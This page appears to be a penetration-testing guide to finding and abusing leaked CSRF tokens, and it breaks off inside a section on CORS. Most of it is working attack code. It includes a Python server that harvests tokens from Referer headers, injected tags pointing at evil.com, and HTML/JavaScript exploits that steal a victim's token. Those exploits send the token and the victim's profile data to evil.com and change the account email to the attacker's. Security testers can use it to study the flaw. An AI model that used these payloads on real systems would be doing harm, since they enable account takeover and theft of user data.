---
title: CSRF Token Leakage Attack & Techniques
description: Advanced exploitation techniques for discovering, extracting, and abusing leaked CSRF tokens through various channels including Referer headers, URL parameters, response bodies, cache poisoning, cross-origin information disclosure, and log exposure for penetration testers.
navigation:
  icon: i-lucide-key-round
  title: CSRF Token Leakage
---

## Understanding CSRF Token Leakage

::note
CSRF token leakage occurs when anti-CSRF tokens are exposed through insecure channels — Referer headers, URL query parameters, browser history, server logs, CDN caches, response bodies accessible cross-origin, or client-side storage. Once an attacker obtains a valid token, every CSRF protection dependent on that token collapses entirely, enabling full state-changing request forgery with the victim's authenticated session.
::

::card-group
  ::card
  ---
  title: Referer Header Leakage
  icon: i-lucide-external-link
  ---
  Tokens embedded in URLs leak through the `Referer` header when navigating to external resources, clicking outbound links, or loading third-party assets from the token-bearing page.
  ::

  ::card
  ---
  title: URL Parameter Exposure
  icon: i-lucide-link
  ---
  CSRF tokens placed in GET parameters appear in browser history, server access logs, proxy logs, bookmark entries, shared URLs, analytics platforms, and cached pages.
  ::

  ::card
  ---
  title: Cross-Origin Response Leakage
  icon: i-lucide-globe
  ---
  Misconfigured CORS policies, JSONP callbacks, script injection, CSS-based exfiltration, and error messages expose tokens to attacker-controlled origins.
  ::

  ::card
  ---
  title: Client-Side Storage Exposure
  icon: i-lucide-database
  ---
  Tokens stored in `localStorage`, `sessionStorage`, JavaScript variables, DOM attributes, or cookies without proper flags become accessible through XSS, browser extensions, or shared device scenarios.
  ::

  ::card
  ---
  title: Cache & CDN Leakage
  icon: i-lucide-hard-drive
  ---
  Improper cache-control headers cause intermediary proxies, CDNs, browser caches, and service workers to store pages containing CSRF tokens, making them retrievable by subsequent users.
  ::

  ::card
  ---
  title: Third-Party Service Exposure
  icon: i-lucide-share-2
  ---
  Analytics scripts, error tracking services, ad networks, social widgets, and third-party JavaScript libraries capture and transmit CSRF tokens present in URLs, DOM, or request metadata.
  ::
::

## Reconnaissance & Token Discovery

### Locating CSRF Tokens in Application

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="HTML Source Analysis"}
  ```bash
  # Extract CSRF tokens from HTML response body
  curl -s https://target.com/settings \
    -H "Cookie: session=VALID" | \
    grep -iEo '(csrf|xsrf|token|_token|authenticity_token|__RequestVerificationToken|antiforgery)["\s:=_-]+[a-zA-Z0-9_/+=.-]{16,}'

  # Search hidden form fields for CSRF tokens
  curl -s https://target.com/profile \
    -H "Cookie: session=VALID" | \
    grep -iP '<input[^>]*(csrf|token|xsrf|nonce|_token)[^>]*>' | \
    grep -oP 'value="[^"]*"'

  # Extract from meta tags
  curl -s https://target.com/ \
    -H "Cookie: session=VALID" | \
    grep -iP '<meta[^>]*(csrf|xsrf|token)[^>]*>' | \
    grep -oP 'content="[^"]*"'

  # Extract from inline JavaScript
  curl -s https://target.com/ \
    -H "Cookie: session=VALID" | \
    grep -iEo "(csrf|xsrf|_token|csrfToken|csrfmiddlewaretoken)\s*[:=]\s*['\"][a-zA-Z0-9_/+=.-]+['\"]"

  # Extract from data attributes
  curl -s https://target.com/ \
    -H "Cookie: session=VALID" | \
    grep -oP 'data-csrf[^=]*="[^"]*"'

  # Full page token extraction with context
  curl -s https://target.com/dashboard \
    -H "Cookie: session=VALID" | \
    grep -iEn '(csrf|xsrf|token|nonce|forgery|antiforgery)' | head -30
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="API Response Analysis"}
  ```bash
  # Check if CSRF token is returned in API responses
  curl -s https://target.com/api/session \
    -H "Cookie: session=VALID" | jq '.'

  curl -s https://target.com/api/csrf-token \
    -H "Cookie: session=VALID" | jq '.'

  curl -s https://target.com/api/user/profile \
    -H "Cookie: session=VALID" | jq '.. | select(type == "string") | select(test("csrf|xsrf|token"; "i"))'

  # Check response headers for CSRF tokens
  curl -sI https://target.com/api/me \
    -H "Cookie: session=VALID" | \
    grep -iE "(csrf|xsrf|token|x-csrf|x-xsrf)"

  # Check Set-Cookie for CSRF token cookies
  curl -sI https://target.com/ | \
    grep -iE "set-cookie.*(csrf|xsrf|token|_token)"

  # Enumerate common CSRF token endpoint paths
  PATHS=(
    "/api/csrf" "/api/csrf-token" "/api/token"
    "/api/session" "/api/auth/csrf" "/api/antiforgery"
    "/csrf" "/token" "/api/v1/csrf"
    "/sanctum/csrf-cookie" "/api/auth/session"
    "/.well-known/csrf" "/api/security/token"
  )

  for path in "${PATHS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${path}" \
      -H "Cookie: session=VALID")
    if [[ "$status" =~ ^(200|204)$ ]]; then
      echo "[+] Token endpoint found: $path (HTTP $status)"
      curl -s "https://target.com${path}" \
        -H "Cookie: session=VALID" | head -c 500
      echo ""
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JavaScript Source Mining"}
  ```bash
  # Download and search JavaScript files for CSRF token handling
  # Step 1: Extract JS file URLs
  curl -s https://target.com/ \
    -H "Cookie: session=VALID" | \
    grep -oP 'src="[^"]*\.js[^"]*"' | \
    sed 's/src="//;s/"//' | sort -u > js_files.txt

  # Step 2: Download and search each JS file
  while read -r js_url; do
    # Handle relative URLs
    if [[ ! "$js_url" =~ ^http ]]; then
      js_url="https://target.com${js_url}"
    fi
    echo "[*] Scanning: $js_url"
    curl -s "$js_url" | grep -iEn \
      "(csrf|xsrf|_token|X-CSRF|csrfToken|antiForgery|csrfmiddlewaretoken)" | \
      head -5
  done < js_files.txt

  # Step 3: Search for token storage patterns
  while read -r js_url; do
    if [[ ! "$js_url" =~ ^http ]]; then
      js_url="https://target.com${js_url}"
    fi
    curl -s "$js_url" | grep -iEn \
      "(localStorage\.(set|get)Item.*csrf|sessionStorage.*csrf|document\.cookie.*csrf|meta\[.*csrf|querySelector.*csrf)" | \
      head -5
  done < js_files.txt

  # Step 4: Search for token transmission in AJAX headers
  while read -r js_url; do
    if [[ ! "$js_url" =~ ^http ]]; then
      js_url="https://target.com${js_url}"
    fi
    curl -s "$js_url" | grep -iEn \
      "(X-CSRF-Token|X-XSRF-TOKEN|X-Requested-With|headers.*csrf|setRequestHeader.*csrf)" | \
      head -5
  done < js_files.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite Token Tracking"}
  ```bash
  # Burp Suite configuration for CSRF token tracking

  # Method 1: Search across all proxy history
  # Burp → Proxy → HTTP History → Filter → Search term: "csrf"
  # Check "Search request headers", "Search request body",
  # "Search response headers", "Search response body"

  # Method 2: Use Logger++ extension
  # Install Logger++ from BApp Store
  # Add filter: Response.Body CONTAINS "csrf" OR
  #             Request.Headers CONTAINS "csrf" OR
  #             Request.URL CONTAINS "csrf" OR
  #             Request.URL CONTAINS "token"

  # Method 3: Session handling rules for token extraction
  # Burp → Settings → Sessions → Session handling rules
  # Add rule → Run macro → Extract token from response
  # Define token location: Form field / Header / Body regex

  # Method 4: Macro for automatic token refresh
  # Project options → Sessions → Macros → Add
  # Select request that returns CSRF token
  # Configure parameter handling: extract from response, update in request

  # Method 5: Active scan configuration
  # Scanner → Scan configuration → Audit → Issues reported
  # Enable: "Cross-site request forgery" checks
  # Enable: "Token in URL" checks
  ```
  :::
::

### Token Placement Classification

::accordion
  :::accordion-item{icon="i-lucide-map-pin" label="Token in URL Query Parameters (HIGH RISK)"}
  ```bash
  # Detect tokens passed as URL query parameters
  # This is the highest risk — tokens leak via Referer, logs, history

  # Check if forms use GET method with CSRF tokens
  curl -s https://target.com/settings \
    -H "Cookie: session=VALID" | \
    grep -iP '<form[^>]*method\s*=\s*["\x27]get["\x27][^>]*>' -A 20 | \
    grep -iP '(csrf|token|_token)'

  # Check URL patterns in Burp proxy history
  # Filter HTTP History by URL containing: token= csrf= _token=

  # Check browser history / URL bar for token exposure
  # Look for patterns like:
  # https://target.com/transfer?csrf_token=abc123&amount=100
  # https://target.com/settings?_token=xyz789
  # https://target.com/action?authenticity_token=def456

  # Test if token survives in URL after form submission
  curl -v "https://target.com/update?csrf_token=LEAKED_TOKEN" \
    -H "Cookie: session=VALID" 2>&1 | grep -i "location\|referer"

  # Check redirect chains preserving token in URL
  curl -v -L "https://target.com/action?token=TEST123" \
    -H "Cookie: session=VALID" 2>&1 | grep -iE "(location|referer).*token"
  ```
  :::

  :::accordion-item{icon="i-lucide-map-pin" label="Token in Request Headers"}
  ```bash
  # Common CSRF token header names
  HEADERS=(
    "X-CSRF-Token"
    "X-XSRF-TOKEN"
    "X-CSRFToken"
    "X-Csrf-Token"
    "X-Requested-With"
    "X-Request-Token"
    "Anti-CSRF-Token"
    "RequestVerificationToken"
    "__RequestVerificationToken"
    "X-Anti-Forgery-Token"
    "X-CSRF-HEADER"
    "CSRF-Token"
    "XSRF-TOKEN"
    "_csrf_token"
  )

  # Test which headers the server expects
  for header in "${HEADERS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com/api/update" \
      -H "Content-Type: application/json" \
      -H "${header}: test_value" \
      -H "Cookie: session=VALID" \
      -d '{"test":"probe"}')
    echo "Header: $header → HTTP $status"
  done

  # Identify where the header value comes from
  # Check if it's read from: cookie, meta tag, API response, localStorage
  ```
  :::

  :::accordion-item{icon="i-lucide-map-pin" label="Token in Request Body"}
  ```bash
  # Common CSRF token body parameter names
  PARAMS=(
    "csrf_token" "csrf" "_token" "token"
    "csrfmiddlewaretoken" "authenticity_token"
    "__RequestVerificationToken" "_csrf"
    "csrfToken" "xsrf_token" "XSRF-TOKEN"
    "anti_csrf_token" "nonce" "state"
    "form_token" "request_token"
  )

  # Test which parameter name is expected
  for param in "${PARAMS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com/api/update" \
      -H "Content-Type: application/json" \
      -H "Cookie: session=VALID" \
      -d "{\"${param}\":\"test_value\",\"email\":\"test@test.com\"}")
    echo "Param: $param → HTTP $status"
  done

  # URL-encoded form parameter test
  for param in "${PARAMS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com/settings" \
      -H "Cookie: session=VALID" \
      -d "${param}=test_value&email=test@test.com")
    echo "Form param: $param → HTTP $status"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-map-pin" label="Token in Cookies (Double-Submit)"}
  ```bash
  # Identify double-submit cookie pattern
  # Token value in cookie must match token in header/body

  # Extract CSRF cookie
  curl -sI https://target.com/ | grep -iE "set-cookie.*(csrf|xsrf|token)"

  # Check cookie attributes
  curl -sI https://target.com/ | grep -i "set-cookie" | \
    while read -r line; do
      if echo "$line" | grep -qi "csrf\|xsrf\|token"; then
        name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
        value=$(echo "$line" | grep -oP 'Set-Cookie:\s*[^=]+=\K[^;]+')
        domain=$(echo "$line" | grep -ioP 'domain=\K[^;]+' || echo "NOT SET")
        path=$(echo "$line" | grep -ioP 'path=\K[^;]+' || echo "/")
        httponly=$(echo "$line" | grep -qi "httponly" && echo "Yes" || echo "No")
        secure=$(echo "$line" | grep -qi "secure" && echo "Yes" || echo "No")
        samesite=$(echo "$line" | grep -ioP 'samesite=\K\w+' || echo "NOT SET")
        
        echo "Cookie: $name"
        echo "  Value: $value"
        echo "  Domain: $domain"
        echo "  Path: $path"
        echo "  HttpOnly: $httponly"
        echo "  Secure: $secure"
        echo "  SameSite: $samesite"
        echo "  Vulnerable: $([ "$httponly" = "No" ] && echo 'XSS readable' || echo 'HttpOnly protected')"
      fi
    done
  ```
  :::

  :::accordion-item{icon="i-lucide-map-pin" label="Token in Client-Side Storage"}
  ```bash
  # Detection requires browser-based inspection or XSS

  # Check JavaScript for localStorage/sessionStorage usage
  curl -s https://target.com/static/app.js | \
    grep -iEn "(localStorage|sessionStorage)\.(set|get|remove)Item\s*\(\s*['\"].*csrf"

  # Check for global JavaScript variable assignment
  curl -s https://target.com/ -H "Cookie: session=VALID" | \
    grep -iEn "(window\.|var |let |const ).*csrf.*="

  # XSS payload to extract stored tokens
  # If XSS exists:
  # localStorage.getItem('csrf_token')
  # sessionStorage.getItem('xsrf-token')
  # document.querySelector('meta[name="csrf-token"]').content
  # document.cookie (if not HttpOnly)

  # Check for token in window.__INITIAL_STATE__ or similar hydration
  curl -s https://target.com/ -H "Cookie: session=VALID" | \
    grep -iEo "window\.__[A-Z_]+__\s*=" | head -5
  
  curl -s https://target.com/ -H "Cookie: session=VALID" | \
    grep -oP 'window\.__\w+__\s*=\s*\K\{[^}]{0,500}' | \
    grep -i csrf
  ```
  :::
::

## Referer Header Token Leakage

::warning
When CSRF tokens are embedded in URLs, the `Referer` header transmits them to every external resource loaded from that page — images, scripts, stylesheets, iframes, and clicked links. This is the most common and critical CSRF token leakage vector.
::

### Detecting Referer-Based Leakage

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Identify Token in URL"}
  ```bash
  # Step 1: Check if any pages have CSRF tokens in their URLs
  # Review Burp proxy history for URL-embedded tokens

  # Grep Burp sitemap export for token patterns in URLs
  grep -iE "\?(csrf|token|_token|authenticity_token|xsrf)=" burp_sitemap.xml

  # Step 2: Check form actions for GET method with tokens
  curl -s https://target.com/account \
    -H "Cookie: session=VALID" | \
    grep -iP '<form[^>]*action="[^"]*\?(csrf|token|_token)[^"]*"'

  # Step 3: Check JavaScript for token appended to URLs
  curl -s https://target.com/static/main.js | \
    grep -iEn "(window\.location|href|action|url|src).*csrf|token.*\?" | head -10

  # Step 4: Check redirects that include token in URL
  curl -sI https://target.com/login -X POST \
    -d "user=test&pass=test" \
    -H "Cookie: session=VALID" | \
    grep -iE "location.*(csrf|token|_token)"

  # Step 5: Trace full redirect chain for token exposure
  curl -v -L https://target.com/oauth/callback?code=xyz \
    -H "Cookie: session=VALID" 2>&1 | \
    grep -iE "(location|referer).*(csrf|token)"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Check Referrer-Policy"}
  ```bash
  # Examine Referrer-Policy configuration
  curl -sI https://target.com/ | grep -i "referrer-policy"

  # Check meta tag referrer policy
  curl -s https://target.com/ | grep -iP '<meta[^>]*referrer[^>]*>'

  # Referrer-Policy values and their leakage impact:
  # no-referrer                → No leakage (fully stripped)
  # no-referrer-when-downgrade → Leaks on HTTPS→HTTPS, strips on HTTPS→HTTP
  # origin                     → Leaks origin only (https://target.com), no path/query
  # origin-when-cross-origin   → Full URL same-origin, origin only cross-origin
  # same-origin                → Full URL same-origin, stripped cross-origin
  # strict-origin              → Origin only same-protocol, stripped on downgrade
  # strict-origin-when-cross-origin → DEFAULT: Full same-origin, origin cross-origin
  # unsafe-url                 → DANGEROUS: Full URL always leaked

  # Check per-element referrer policies
  curl -s https://target.com/settings \
    -H "Cookie: session=VALID" | \
    grep -iP 'referrerpolicy\s*=\s*"[^"]*"'

  # Check link rel attributes
  curl -s https://target.com/settings \
    -H "Cookie: session=VALID" | \
    grep -iP 'rel\s*=\s*"[^"]*noreferrer[^"]*"'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Identify External Resources"}
  ```bash
  # Find all external resources loaded on token-bearing pages
  # These resources receive the Referer header with the token

  # External images
  curl -s https://target.com/settings?csrf_token=TOKEN \
    -H "Cookie: session=VALID" | \
    grep -oP 'src="https?://(?!target\.com)[^"]*"' | sort -u

  # External scripts
  curl -s https://target.com/settings?csrf_token=TOKEN \
    -H "Cookie: session=VALID" | \
    grep -oP '<script[^>]*src="https?://(?!target\.com)[^"]*"' | sort -u

  # External stylesheets
  curl -s https://target.com/settings?csrf_token=TOKEN \
    -H "Cookie: session=VALID" | \
    grep -oP 'href="https?://(?!target\.com)[^"]*\.css[^"]*"' | sort -u

  # External iframes
  curl -s https://target.com/settings?csrf_token=TOKEN \
    -H "Cookie: session=VALID" | \
    grep -oP '<iframe[^>]*src="https?://(?!target\.com)[^"]*"' | sort -u

  # External link targets (clicked links leak Referer)
  curl -s https://target.com/settings?csrf_token=TOKEN \
    -H "Cookie: session=VALID" | \
    grep -oP 'href="https?://(?!target\.com)[^"]*"' | sort -u | head -20

  # Third-party analytics/tracking
  curl -s https://target.com/settings?csrf_token=TOKEN \
    -H "Cookie: session=VALID" | \
    grep -iEo 'https?://[^"'\''> ]*(google|facebook|analytics|tracking|pixel|tag|cdn|ad)[^"'\''> ]*' | sort -u
  ```
  :::
::

### Exploiting Referer Leakage

::tabs
  :::tabs-item{icon="i-lucide-code" label="Attacker-Controlled Resource Injection"}
  ```html
  <!-- If attacker can inject content on a page that has CSRF token in URL -->
  <!-- Example: User profile, comments, forum posts with HTML/image support -->

  <!-- Method 1: Image tag pointing to attacker server -->
  <!-- When loaded, browser sends Referer: https://target.com/page?csrf_token=LEAKED -->
  <img src="https://evil.com/collect.gif" style="display:none">

  <!-- Method 2: Stylesheet import -->
  <link rel="stylesheet" href="https://evil.com/theme.css">

  <!-- Method 3: Script tag -->
  <script src="https://evil.com/analytics.js"></script>

  <!-- Method 4: Background image via CSS -->
  <div style="background-image:url('https://evil.com/bg.png')"></div>

  <!-- Method 5: Favicon override -->
  <link rel="icon" href="https://evil.com/favicon.ico">

  <!-- Method 6: Prefetch link -->
  <link rel="prefetch" href="https://evil.com/page">

  <!-- Method 7: Object/Embed tag -->
  <object data="https://evil.com/obj" style="display:none"></object>

  <!-- Method 8: Source tag in video/audio -->
  <video><source src="https://evil.com/video.mp4"></video>

  <!-- Method 9: SVG image reference -->
  <svg><image href="https://evil.com/img.svg"/></svg>

  <!-- Method 10: Meta refresh to attacker with delay -->
  <!-- Captures token from current URL in Referer -->
  <meta http-equiv="refresh" content="5;url=https://evil.com/landing">
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Attacker Server Token Collector"}
  ```python
  #!/usr/bin/env python3
  """
  CSRF Token Collector Server
  Captures leaked tokens from Referer headers
  """

  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs
  import json, re, datetime, sys

  LOGFILE = 'leaked_tokens.json'
  collected = []

  class TokenCollector(BaseHTTPRequestHandler):
      def do_GET(self):
          referer = self.headers.get('Referer', '')
          origin = self.headers.get('Origin', '')
          ua = self.headers.get('User-Agent', '')
          
          # Extract CSRF tokens from Referer URL
          tokens = {}
          if referer:
              parsed = urlparse(referer)
              params = parse_qs(parsed.query)
              
              token_patterns = [
                  'csrf_token', 'csrf', '_token', 'token',
                  'authenticity_token', 'csrfmiddlewaretoken',
                  'xsrf_token', 'XSRF-TOKEN', '__RequestVerificationToken',
                  'anti_csrf_token', 'form_token', 'nonce', 'state'
              ]
              
              for key in params:
                  if any(p in key.lower() for p in ['csrf', 'token', 'xsrf', 'nonce', 'forgery']):
                      tokens[key] = params[key][0]
              
              # Also try regex extraction
              token_match = re.findall(
                  r'(?:csrf|token|xsrf|nonce|_token)[_=-]?([a-zA-Z0-9_/+=.-]{16,})',
                  referer, re.IGNORECASE
              )
              if token_match:
                  tokens['regex_extracted'] = token_match

          if tokens:
              entry = {
                  'timestamp': datetime.datetime.now().isoformat(),
                  'ip': self.client_address[0],
                  'referer': referer,
                  'tokens': tokens,
                  'user_agent': ua,
                  'path': self.path
              }
              collected.append(entry)
              
              # Save to file
              with open(LOGFILE, 'w') as f:
                  json.dump(collected, f, indent=2)
              
              print(f"\n[!!!] TOKEN CAPTURED:")
              print(f"  Referer: {referer}")
              print(f"  Tokens:  {json.dumps(tokens)}")
              print(f"  IP:      {self.client_address[0]}")
              print(f"  UA:      {ua[:80]}")
          
          # Serve requested resource type
          path = self.path.lower()
          if path.endswith(('.gif', '.png', '.jpg', '.ico')):
              # 1x1 transparent GIF
              self.send_response(200)
              self.send_header('Content-Type', 'image/gif')
              self.send_header('Cache-Control', 'no-store')
              self.end_headers()
              self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
          elif path.endswith('.css'):
              self.send_response(200)
              self.send_header('Content-Type', 'text/css')
              self.end_headers()
              self.wfile.write(b'/* empty */')
          elif path.endswith('.js'):
              self.send_response(200)
              self.send_header('Content-Type', 'application/javascript')
              self.end_headers()
              self.wfile.write(b'void(0);')
          else:
              self.send_response(200)
              self.send_header('Content-Type', 'text/html')
              self.end_headers()
              self.wfile.write(b'<html><body>OK</body></html>')

      def log_message(self, format, *args):
          ref = self.headers.get('Referer', '-')[:80]
          print(f"[{self.client_address[0]}] {format % args} | Referer: {ref}")

  port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
  print(f"[*] CSRF Token Collector listening on port {port}")
  print(f"[*] Tokens saved to: {LOGFILE}")
  print(f"[*] Inject resources pointing to: http://YOUR_IP:{port}/")
  HTTPServer(('0.0.0.0', port), TokenCollector).serve_forever()
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Clickable Link Exploitation"}
  ```html
  <!-- If token-bearing page contains clickable links to external sites -->
  <!-- Social links, partner links, ads, user-submitted links -->

  <!-- Scenario: User is on https://target.com/settings?csrf_token=SECRET -->
  <!-- Page contains: <a href="https://blog.target.com/post">Read more</a> -->
  <!-- Click → Referer: https://target.com/settings?csrf_token=SECRET -->

  <!-- Exploitation via open redirect on external site -->
  <!-- If blog.target.com has open redirect: -->
  <!-- blog.target.com/redirect?url=https://evil.com -->
  <!-- Chain: target.com/settings?token=X → blog → evil.com (Referer contains token) -->

  <!-- Exploitation via user-generated content link -->
  <!-- If attacker can post a link on target.com that users click: -->
  <!-- Forum post: "Check out https://evil.com/interesting-article" -->
  <!-- When clicked from page with token in URL → token leaked via Referer -->

  <!-- Attacker landing page that captures and uses the token -->
  <html>
  <body>
  <h1>Interesting Article</h1>
  <p>Loading content...</p>
  <script>
  // Extract CSRF token from document.referrer
  const referrer = document.referrer;
  const urlParams = new URL(referrer).searchParams;
  
  // Try common parameter names
  const tokenNames = [
    'csrf_token', 'csrf', '_token', 'token',
    'authenticity_token', 'csrfmiddlewaretoken',
    'xsrf_token', '__RequestVerificationToken'
  ];
  
  let csrfToken = null;
  for (const name of tokenNames) {
    if (urlParams.has(name)) {
      csrfToken = urlParams.get(name);
      break;
    }
  }
  
  if (csrfToken) {
    console.log('[+] CSRF token extracted:', csrfToken);
    
    // Use stolen token to perform CSRF attack
    fetch('https://target.com/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
    
    // Also exfiltrate token to attacker server
    navigator.sendBeacon('/log', JSON.stringify({
      token: csrfToken,
      referrer: referrer,
      time: Date.now()
    }));
  }
  </script>
  </body>
  </html>
  ```
  :::
::

### Third-Party Resource Leakage

::code-collapse
```bash
# Comprehensive analysis of third-party resources that receive Referer headers
# containing CSRF tokens

# Step 1: Map all third-party domains loaded from token-bearing pages
curl -s "https://target.com/settings?csrf_token=PROBE" \
  -H "Cookie: session=VALID" | \
  grep -oP 'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | \
  grep -v "target\.com" | \
  sort -u | tee third_party_domains.txt

# Step 2: Categorize third-party services
echo "=== Analytics ==="
grep -iE "(google|analytics|segment|mixpanel|heap|amplitude|hotjar|fullstory)" third_party_domains.txt

echo "=== CDN/Assets ==="
grep -iE "(cloudflare|cdn|akamai|fastly|cloudfront|unpkg|cdnjs|jsdelivr)" third_party_domains.txt

echo "=== Social/Widgets ==="
grep -iE "(facebook|twitter|linkedin|pinterest|instagram|addthis|sharethis)" third_party_domains.txt

echo "=== Advertising ==="
grep -iE "(doubleclick|googlesyndication|adservice|criteo|outbrain|taboola)" third_party_domains.txt

echo "=== Error Tracking ==="
grep -iE "(sentry|bugsnag|rollbar|errorception|raygun|airbrake)" third_party_domains.txt

echo "=== Chat/Support ==="
grep -iE "(intercom|zendesk|freshdesk|drift|crisp|tawk|livechat)" third_party_domains.txt

# Step 3: Verify each third-party domain receives the Referer
for domain in $(cat third_party_domains.txt); do
  echo -n "Domain: $domain → "
  # Check if resource request sends Referer
  # This requires client-side verification or controlled environment
  echo "Potential Referer leak target"
done

# Step 4: Check if any third-party service logs/exposes Referer data
# Analytics dashboards, error tracking UIs, CDN logs
# If attacker compromises any third-party account → token access

# Step 5: Check Subresource Integrity (SRI) for third-party scripts
curl -s "https://target.com/settings?csrf_token=PROBE" \
  -H "Cookie: session=VALID" | \
  grep -P '<script[^>]*src="https?://(?!target\.com)' | \
  grep -v "integrity=" | \
  sed 's/.*src="\([^"]*\)".*/NO SRI: \1/'
# Scripts without SRI can be modified by compromised CDNs to exfiltrate tokens
```
::

## Cross-Origin Response Token Leakage

### CORS Misconfiguration Exploitation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="CORS Policy Probing"}
  ```bash
  # Test if CORS allows reading responses containing CSRF tokens

  # Test 1: Arbitrary origin reflection
  curl -s https://target.com/api/session \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=VALID" \
    -D - -o /dev/null | grep -i "access-control"

  # Test 2: Null origin
  curl -s https://target.com/api/session \
    -H "Origin: null" \
    -H "Cookie: session=VALID" \
    -D - -o /dev/null | grep -i "access-control"

  # Test 3: Subdomain reflection
  curl -s https://target.com/api/session \
    -H "Origin: https://evil.target.com" \
    -H "Cookie: session=VALID" \
    -D - -o /dev/null | grep -i "access-control"

  # Test 4: Protocol downgrade
  curl -s https://target.com/api/session \
    -H "Origin: http://target.com" \
    -H "Cookie: session=VALID" \
    -D - -o /dev/null | grep -i "access-control"

  # Test 5: Wildcard with credentials
  # If Access-Control-Allow-Origin: * AND Access-Control-Allow-Credentials: true
  # → Critical: any origin can read authenticated responses

  # Test 6: Regex bypass patterns
  ORIGINS=(
    "https://target.com.evil.com"
    "https://targetcom.evil.com"
    "https://evil-target.com"
    "https://target.com%60evil.com"
    "https://target.com%2Eevil.com"
    "https://target.comevil.com"
  )

  for origin in "${ORIGINS[@]}"; do
    echo -n "Origin: $origin → "
    curl -s https://target.com/api/session \
      -H "Origin: $origin" \
      -H "Cookie: session=VALID" \
      -D /dev/stderr -o /dev/null 2>&1 | grep -oP "Access-Control-Allow-Origin:\s*\K.*" || echo "Blocked"
  done

  # Automated CORS scanning
  # Check all endpoints that return CSRF tokens
  ENDPOINTS=(
    "/api/session" "/api/csrf" "/api/csrf-token"
    "/api/user/profile" "/api/me" "/api/auth/status"
  )

  for ep in "${ENDPOINTS[@]}"; do
    echo "--- $ep ---"
    for origin in "https://evil.com" "null" "https://evil.target.com"; do
      resp=$(curl -s "https://target.com${ep}" \
        -H "Origin: $origin" \
        -H "Cookie: session=VALID" \
        -D /dev/stderr 2>&1)
      acao=$(echo "$resp" | grep -oP "Access-Control-Allow-Origin:\s*\K.*")
      acac=$(echo "$resp" | grep -oP "Access-Control-Allow-Credentials:\s*\K.*")
      if [ -n "$acao" ]; then
        echo "  Origin=$origin → ACAO=$acao ACAC=$acac"
      fi
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="CORS Token Extraction Exploit"}
  ```html
  <!-- Exploit CORS misconfiguration to read CSRF token from API response -->

  <!-- Scenario 1: Origin reflection with credentials -->
  <html>
  <body>
  <script>
  // If target reflects attacker origin in ACAO with ACAC: true
  fetch('https://target.com/api/csrf-token', {
    method: 'GET',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    const csrfToken = data.csrf_token || data.token || data._token;
    console.log('[+] Stolen CSRF token:', csrfToken);
    
    // Now use the stolen token to perform CSRF
    return fetch('https://target.com/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  })
  .then(response => {
    console.log('[+] CSRF attack result:', response.status);
    // Exfiltrate confirmation
    navigator.sendBeacon('https://evil.com/success', 
      JSON.stringify({ status: response.status }));
  });
  </script>
  </body>
  </html>

  <!-- Scenario 2: Null origin with sandboxed iframe -->
  <html>
  <body>
  <iframe sandbox="allow-scripts" srcdoc="
  <script>
  fetch('https://target.com/api/csrf-token', {
    credentials: 'include'
  })
  .then(r => r.text())
  .then(body => {
    // Origin: null may be reflected in ACAO
    parent.postMessage({token: body}, '*');
  });
  </script>
  "></iframe>
  <script>
  window.addEventListener('message', function(event) {
    try {
      const data = JSON.parse(event.data.token);
      const token = data.csrf_token || data.token;
      if (token) {
        console.log('[+] Token via null origin:', token);
        // Perform CSRF with extracted token
      }
    } catch(e) {}
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Subdomain CORS Exploitation"}
  ```html
  <!-- If CORS allows *.target.com and attacker controls a subdomain -->
  <!-- Via subdomain takeover or XSS on any subdomain -->

  <!-- Host on: controlled-subdomain.target.com -->
  <html>
  <body>
  <script>
  // Origin: https://controlled-subdomain.target.com
  // ACAO: https://controlled-subdomain.target.com (reflected)
  // ACAC: true

  async function extractAndExploit() {
    // Step 1: Read CSRF token from main domain
    const tokenResp = await fetch('https://target.com/api/csrf-token', {
      credentials: 'include'
    });
    const tokenData = await tokenResp.json();
    const csrf = tokenData.token;
    
    // Step 2: Read additional sensitive data
    const profileResp = await fetch('https://target.com/api/user/profile', {
      credentials: 'include'
    });
    const profile = await profileResp.json();
    
    // Step 3: Exfiltrate everything
    await fetch('https://evil.com/exfil', {
      method: 'POST',
      body: JSON.stringify({ csrf, profile })
    });
    
    // Step 4: Perform CSRF attack with valid token
    await fetch('https://target.com/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf
      },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  }

  extractAndExploit();
  </script>
  </body>
  </html>
